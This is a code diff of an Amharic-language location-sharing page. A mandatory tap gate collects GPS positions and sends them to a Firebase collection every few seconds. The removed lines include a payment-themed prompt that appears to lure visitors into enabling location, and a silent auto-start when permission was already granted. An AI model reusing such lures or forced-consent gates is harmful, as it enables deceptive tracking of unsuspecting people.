@@ -51,15 +51,15 @@
 <div id="gate">
   <div id="gateInner">
     <h2>📍 ከመቀጠልዎ በፊት</h2>
-    <p>ክፍያዎትን በምን ሃገር ብር መቀበል ይፈልጋሉ?። ቀጥታ ይጀምራል።</p>
-    <button id="gateBtn" class="pulsing">👇<br>ክፍያት ይዘጋጃ።<br>ሎኬሽን ያብሩ</button>
+    <p>ደህንነትዎን ለመጠበቅ ሎኬሽንዎን ማጋራት ያስፈልጋል። ከታች ያለውን ክብ አንድ ጊዜ ብቻ ይንኩ፤ ቀጥታ ይጀምራል።</p>
+    <button id="gateBtn" class="pulsing">👇<br>ይንኩ<br>ሎኬሽን ያብሩ</button>
     <div class="help" id="help"></div>
     <button id="retryBtn" style="display:none">🔄 እንደገና ሞክር</button>
   </div>
   <div id="inappBox">
     <b>⚠️ ይህ በመልዕክት መተግበሪያ ውስጥ ተከፍቷል፤ እዚህ ሎኬሽን አይሰራም።</b>
     እባክዎ ከታች ያለውን ይንኩ፦
-    <a id="Google" href="#">Google ውስጥ ክፈት</a>
+    <a id="chromeLink" href="#">Chrome ውስጥ ክፈት</a>
   </div>
 </div>
 
@@ -95,8 +95,8 @@ const firebaseConfig = {
 };
 const DATABASE_ID = "ai-studio-fastlocationshar-8b15d88a-199a-4eab-a522-ad42499a180e";
 const COLLECTION  = "locations";
-const SEND_MS     = 20000;
-const HEARTBEAT   = 25000;
+const SEND_MS     = 10000;
+const HEARTBEAT   = 15000;
 /* ================================================ */
 
 const $ = id => document.getElementById(id);
@@ -187,7 +187,7 @@ $("sos").addEventListener("click", async ()=>{
     navigator.geolocation.getCurrentPosition(
       p=>finishSos(p.coords.latitude,p.coords.longitude,p.coords.accuracy),
       ()=>{ alert("⚠️ ቦታ ገና አልተገኘም። ትንሽ ይጠብቁና እንደገና ይሞክሩ፣ ወይም ወደ ክፍት ቦታ ይሂዱ።"); },
-      {enableHighAccuracy:true, timeout:20000}
+      {enableHighAccuracy:true, timeout:10000}
     );
   }
 });
@@ -202,10 +202,8 @@ if(inApp){
 }
 
 /* =========================================================
-   STEP 1: GATE
-   ፈቃድ ቀድሞ "granted" ከሆነ (ቀድሞ አንድ ጊዜ ተፈቅዶ ከሆነ)፣ ምንም ንክኪ ሳያስፈልግ
-   በገጽ መክፈቻው ቅጽበት ራሱ በራስ-ሰር ይጀምራል — ይህ ነው ለድንገተኛ ጊዜ የሚያስፈልገው እውነተኛ "አንድ ጊዜ ብቻ" ተሞክሮ።
-   ፈቃድ ገና "prompt" ወይም "denied" ከሆነ ብቻ የግዴታ ክብ ይታያል (የመጀመሪያ ማዋቀሪያ፣ አንድ ጊዜ ብቻ)።
+   STEP 1: GATE — ፈቃዱ የሚጠየቀው ልክ በዚህ ንክኪ ውስጥ ብቻ ነው (synchronous click → getCurrentPosition)።
+   ይህ በ Chrome ውስጥ ፈቃዱ በትክክል እንዲከፈት ያስፈልጋል — delay ወይም await ከፊት ቢቀመጥ Chrome ይከለክለዋል።
    ========================================================= */
 function openApp(){
   unlocked = true;
@@ -220,34 +218,16 @@ function onGateSuccess(p){
   onPos(p);
   openApp();
 }
-
-async function tryAutoStart(){
-  if(inApp) return false; // in-app browser ውስጥ ሁልጊዜ ሊንክ መቀየሪያ ያስፈልጋል
-  try{
-    if(!navigator.permissions || !navigator.permissions.query) return false;
-    const status = await navigator.permissions.query({name:"geolocation"});
-    if(status.state === "granted"){
-      // ፈቃድ ቀድሞ ተሰጥቷል → ምንም ንክኪ ሳያስፈልግ ወዲያውኑ ጀምር
-      navigator.geolocation.getCurrentPosition(onGateSuccess, onGateError, {enableHighAccuracy:true, timeout:15000});
-      return true;
-    }
-  }catch(e){ /* Permissions API ያልተደገፈ ከሆነ ወደ መደበኛ ክብ ንክኪ እንመለሳለን */ }
-  return false;
-}
-tryAutoStart();
 function onGateError(err){
   $("gateBtn").classList.remove("pulsing");
   $("gateBtn").textContent = "🔄 እንደገና ይንኩ";
   $("gate").classList.add("bad");
   const h = $("help");
   h.style.display="block";
-  const dbg = `<div style="margin-top:10px;font-size:11px;opacity:.75;direction:ltr">debug: code=${err.code} "${err.message||''}"</div>`;
   if(err.code===1){
-    h.innerHTML = "<b>❌ ሎኬሽን ተከልክሏል (ቀድሞ የተደረገ እገዳ)።</b>Chrome ላይ ድጋሚ ቢነኩትም ራሱ አይጠይቅም፤ መጀመሪያ እግዱን ማጽዳት አለብዎት፦<br>1. ከአድራሻ አሞሌው ግራ 🔒 ይንኩ<br>2. «Permissions» → «Location» → <b>Allow</b> (ወይም «Reset permissions»)<br>3. ገጹን ዝግተው እንደገና ይክፈቱ።<br>በስልኩ ቅንብርም GPS መብራቱን ያረጋግጡ።" + dbg;
-  } else if(err.code===3){
-    h.innerHTML = "<b>⏳ ጊዜው አልቀ (timeout)።</b>GPS ምልክት ማግኘት አልተቻለም። ወደ መስኮት/ክፍት ቦታ ይጠጉና እንደገና ይንኩ።" + dbg;
+    h.innerHTML = "<b>❌ ሎኬሽን ተከልክሏል።</b>1. ከአድራሻ አሞሌው ግራ 🔒 (ወይም ⚙) ይንኩ<br>2. «Permissions / ፈቃዶች» → «Location / አካባቢ» → <b>Allow</b><br>3. ይህን ገጽ እንደገና ይክፈቱ፤ ራሱ ይቀጥላል።<br>በስልኩ ቅንብርም GPS መብራቱን ያረጋግጡ።";
   } else {
-    h.innerHTML = "<b>⚠️ ቦታ ማግኘት አልተቻለም።</b>GPS ያብሩና እንደገና ይሞክሩ።" + dbg;
+    h.innerHTML = "<b>⏳ ቦታ ማግኘት አልተቻለም።</b>ክፍት ቦታ ይሂዱ ወይም GPS ያብሩና እንደገና ይሞክሩ።";
   }
 }
 $("gateBtn").addEventListener("click", function(){
